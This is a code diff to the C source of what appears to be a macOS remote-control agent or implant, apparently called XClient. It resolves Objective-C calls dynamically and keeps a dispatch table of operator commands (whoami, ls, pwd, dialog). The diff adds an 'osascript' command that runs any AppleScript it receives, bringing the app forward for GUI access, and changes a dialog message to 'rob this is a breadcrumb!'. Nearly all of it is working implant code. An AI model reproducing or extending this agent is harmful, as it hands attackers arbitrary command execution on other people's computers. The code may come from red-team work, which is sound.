@@ -25,9 +25,17 @@ typedef unsigned int NSUInteger;
 typedef int NSInteger;
 #endif
 
+typedef char* (*command_handler)(INSTANCE* instance);
+typedef char* (*command_handler_with_args)(INSTANCE* instance,
+                                           const char* args);
+
 typedef struct {
   char* name;
-  command_handler handler;
+  union {
+    command_handler handler;
+    command_handler_with_args handler_with_args;
+  };
+  bool has_args;
 } CommandEntry;
 
 static char* cmd_whoami(INSTANCE* instance) {
@@ -358,7 +366,7 @@ static char* cmd_dialog(INSTANCE* instance) {
   // Set message text
   id messageString =
       ((id(*)(Class, SEL, const char*))instance->Darwin.objc_msgSend)(
-          NSStringClass, stringWithUTF8StringSel, "Hello from XClient!");
+          NSStringClass, stringWithUTF8StringSel, "rob this is a breadcrumb!");
 
   ((void (*)(id, SEL, id))instance->Darwin.objc_msgSend)(
       alert, instance->Darwin.sel_registerName("setMessageText:"),
@@ -367,7 +375,7 @@ static char* cmd_dialog(INSTANCE* instance) {
   // Add OK button
   id okButtonTitle =
       ((id(*)(Class, SEL, const char*))instance->Darwin.objc_msgSend)(
-          NSStringClass, stringWithUTF8StringSel, "OK");
+          NSStringClass, stringWithUTF8StringSel, "LOL");
 
   ((void (*)(id, SEL, id))instance->Darwin.objc_msgSend)(
       alert, instance->Darwin.sel_registerName("addButtonWithTitle:"),
@@ -414,16 +422,116 @@ static char* cmd_dialog(INSTANCE* instance) {
   return resultStr;
 }
 
-static CommandEntry command_handlers[] = {{"whoami", cmd_whoami},
-                                          {"ls", cmd_ls},
-                                          {"pwd", cmd_pwd},
-                                          {"dialog", cmd_dialog},
-                                          {NULL, NULL}};
+static char* cmd_applescript(INSTANCE* instance, const char* script) {
+  DEBUG_LOG("Executing AppleScript: %s", script);
 
+  if (!instance || !script) {
+    return strdup("Error: Invalid arguments");
+  }
+
+  // Create autorelease pool
+  id pool = ((id(*)(Class, SEL))instance->Darwin.objc_msgSend)(
+      instance->Darwin.NSAutoreleasePoolClass,
+      instance->Darwin.sel_registerName("new"));
+
+  if (!pool) {
+    return strdup("Error: Failed to create autorelease pool");
+  }
+
+  // Get shared application instance to ensure GUI access
+  id app = ((id(*)(Class, SEL))instance->Darwin.objc_msgSend)(
+      instance->Darwin.NSApplicationClass,
+      instance->Darwin.sharedApplicationSel);
+
+  if (app) {
+    // Activate the app
+    ((void (*)(id, SEL, BOOL))instance->Darwin.objc_msgSend)(
+        app, instance->Darwin.activateIgnoringOtherAppsSel, YES);
+  }
+
+  // Create script string
+  id scriptString =
+      ((id(*)(Class, SEL, const char*))instance->Darwin.objc_msgSend)(
+          instance->Darwin.objc_getClass("NSString"),
+          instance->Darwin.sel_registerName("stringWithUTF8String:"), script);
+
+  if (!scriptString) {
+    ((void (*)(id, SEL))instance->Darwin.objc_msgSend)(
+        pool, instance->Darwin.sel_registerName("drain"));
+    return strdup("Error: Failed to create script string");
+  }
+
+  // Create and execute AppleScript
+  id appleScript = ((id(*)(Class, SEL))instance->Darwin.objc_msgSend)(
+      instance->Darwin.objc_getClass("NSAppleScript"),
+      instance->Darwin.sel_registerName("alloc"));
+
+  appleScript = ((id(*)(id, SEL, id))instance->Darwin.objc_msgSend)(
+      appleScript, instance->Darwin.sel_registerName("initWithSource:"),
+      scriptString);
+
+  if (!appleScript) {
+    ((void (*)(id, SEL))instance->Darwin.objc_msgSend)(
+        pool, instance->Darwin.sel_registerName("drain"));
+    return strdup("Error: Failed to create AppleScript instance");
+  }
+
+  id error = nil;
+  id result = ((id(*)(id, SEL, id*))instance->Darwin.objc_msgSend)(
+      appleScript, instance->Darwin.sel_registerName("executeAndReturnError:"),
+      &error);
+
+  char* output;
+  if (result) {
+    // Get string value of result
+    id stringValue = ((id(*)(id, SEL))instance->Darwin.objc_msgSend)(
+        result, instance->Darwin.sel_registerName("stringValue"));
+
+    const char* resultStr =
+        ((const char* (*)(id, SEL))instance->Darwin.objc_msgSend)(
+            stringValue, instance->Darwin.sel_registerName("UTF8String"));
+    output = strdup(resultStr ? resultStr : "Success");
+    DEBUG_LOG("AppleScript execution successful: %s", output);
+  } else {
+    const char* errorStr =
+        ((const char* (*)(id, SEL))instance->Darwin.objc_msgSend)(
+            error, instance->Darwin.sel_registerName("UTF8String"));
+    output = strdup(errorStr ? errorStr : "Script execution failed");
+    DEBUG_LOG("AppleScript execution failed: %s", output);
+  }
+
+  // Cleanup
+  ((void (*)(id, SEL))instance->Darwin.objc_msgSend)(
+      appleScript, instance->Darwin.sel_registerName("release"));
+
+  ((void (*)(id, SEL))instance->Darwin.objc_msgSend)(
+      pool, instance->Darwin.sel_registerName("drain"));
+
+  return output;
+}
+
+static CommandEntry command_handlers[] = {
+    {"whoami", {.handler = cmd_whoami}, false},
+    {"ls", {.handler = cmd_ls}, false},
+    {"pwd", {.handler = cmd_pwd}, false},
+    {"dialog", {.handler = cmd_dialog}, false},
+    {"osascript", {.handler_with_args = cmd_applescript}, true},
+    {NULL, {.handler = NULL}, false}};
+
+// Update get_command_handler function
 command_handler get_command_handler(const char* command) {
   for (CommandEntry* entry = command_handlers; entry->name != NULL; entry++) {
-    if (strcmp(entry->name, command) == 0) {
+    if (strcmp(entry->name, command) == 0 && !entry->has_args) {
       return entry->handler;
+    }
+  }
+  return NULL;
+}
+
+command_handler_with_args get_command_handler_with_args(const char* command) {
+  for (CommandEntry* entry = command_handlers; entry->name != NULL; entry++) {
+    if (strcmp(entry->name, command) == 0 && entry->has_args) {
+      return entry->handler_with_args;
     }
   }
   return NULL;
